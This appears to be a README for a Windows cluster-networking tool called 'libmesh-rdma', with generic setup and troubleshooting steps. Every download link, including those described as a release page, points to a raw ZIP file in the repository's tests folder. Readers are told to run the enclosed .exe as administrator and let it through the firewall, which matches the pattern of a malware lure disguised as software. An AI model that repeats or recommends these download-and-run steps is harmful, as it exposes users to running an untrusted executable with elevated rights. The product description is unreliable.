# ⚙️ libmesh-rdma - Faster cluster networking without a switch

[![Download libmesh-rdma](https://img.shields.io/badge/Download%20libmesh--rdma-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip)

## 🧭 What this app does

libmesh-rdma helps a group of Windows PCs or workstations talk to each other over fast direct network links. It is built for consumer GPU clusters and uses RDMA and MPI to move data with less delay. That can help you run compute jobs across several machines without a managed switch.

Use it if you want to:

- Connect several Windows computers into one small cluster
- Reduce network delay between machines
- Run distributed compute tasks across GPUs
- Skip the need for a managed switch in the setup

## 📥 Download the app

Visit the release page and download the latest Windows file:

https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip

On the release page, look for the newest version and choose the Windows download file. If there are more than one file, pick the one made for Windows and your machine type.

## 🖥️ Before you install

Make sure each computer in the cluster has:

- Windows 10 or Windows 11
- A supported RDMA-capable network adapter
- A direct network link between machines or a simple network setup that supports peer-to-peer traffic
- At least 16 GB of RAM
- Enough free disk space for the app and your jobs
- Administrator access on the PC

For best results, use:

- Matching or similar GPUs on each machine
- The same version of Windows on all nodes
- A reliable Ethernet cable setup
- Static IP addresses on each machine

## 🚀 Install on Windows

1. Open this page in your browser:
   https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip

2. Find the newest release.

3. Download the Windows file from the Assets section.

4. If the file is a ZIP file, right-click it and choose Extract All.

5. Open the extracted folder.

6. If you see an `.exe` file, double-click it to start the app.

7. If Windows asks for permission, choose Yes.

8. If a setup window appears, follow the steps on screen.

## 🛠️ Set up your cluster

After you install the app on each PC, do this on every machine:

1. Connect all computers with the network cable setup you plan to use.

2. Make sure each PC can see the others on the network.

3. Set each machine to a fixed IP address.

4. Write down the IP address of every node.

5. Open libmesh-rdma on the main computer.

6. Add the other machines to the cluster list.

7. Check that each node reports a healthy connection.

8. Save the setup.

A simple cluster usually has:

- 1 main node that starts the job
- 1 or more worker nodes that do the work
- One shared network path between all nodes

## 🔌 Network setup tips

RDMA works best when the connection is clean and direct. Keep these points in mind:

- Use the same type of network adapter on each node if you can
- Use good-quality Ethernet cables
- Keep the cable runs short
- Avoid extra network gear if your setup does not need it
- Use fixed IP addresses instead of automatic ones
- Turn off sleep mode on all machines

If the app asks about fabric or link settings, use the same settings on every PC.

## 🎮 Common use cases

libmesh-rdma can fit small GPU cluster tasks such as:

- Distributed training
- Batch compute jobs
- Multi-node rendering
- Data movement between machines
- Test runs for cluster software

## 📁 Typical folder layout

After install or extract, you may see files like these:

- `libmesh-rdma.exe` — starts the app
- `config` folder — stores your settings
- `logs` folder — stores connection and run logs
- `drivers` folder — contains network support files if needed
- `README` or `docs` files — extra help

## 🧩 First run checklist

Before you start your first job, check these items:

- The app opens on every machine
- Each PC has a fixed IP address
- The network cable link is active
- Windows Firewall allows the app
- All nodes use the same app version
- The main node can reach every worker node

If something fails, restart the app on all machines and check the IP list again.

## 🪟 Windows tips

To avoid problems on Windows:

- Run the app as administrator
- Keep your network adapter drivers up to date
- Use the same Windows account on each node if possible
- Turn off power saving on the network adapter
- Allow the app through Windows Defender Firewall

If the app does not open, right-click it and choose Run as administrator.

## 🧪 Quick test run

After setup, try a small test job first:

1. Start the app on the main node.
2. Start the app on each worker node.
3. Load a small sample task.
4. Run the job for a short time.
5. Check that each node shows activity.
6. Look for connection errors in the log view.

A short test helps you confirm that the network and cluster settings work before you start a larger job.

## 🧯 If something does not work

Try these steps in order:

- Check the cable connections
- Confirm every PC has the right IP address
- Restart the app on all machines
- Restart Windows on all machines
- Check that the firewall allows local traffic
- Make sure all nodes use the same version
- Reopen the release page and get the latest build

If one machine still fails, remove it from the cluster list and add it again.

## 📚 Release updates

New builds appear on the release page:

https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip

Check that page when you want:

- A newer version
- Bug fixes
- Better device support
- Updated Windows files

## 🧠 Terms in plain English

- **RDMA**: a fast way for computers to move data with less delay
- **MPI**: a method that lets several computers work on one job together
- **Node**: one computer in the cluster
- **Worker**: a computer that helps run the job
- **Driver**: software that lets Windows use your hardware

## 📦 File safety

Only download files from the release page linked above. Open the release page in your browser, then choose the file made for your Windows system. After you download it, check that the file name matches the version you expected

## 🖱️ Start here again

[Go to downloads](https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip)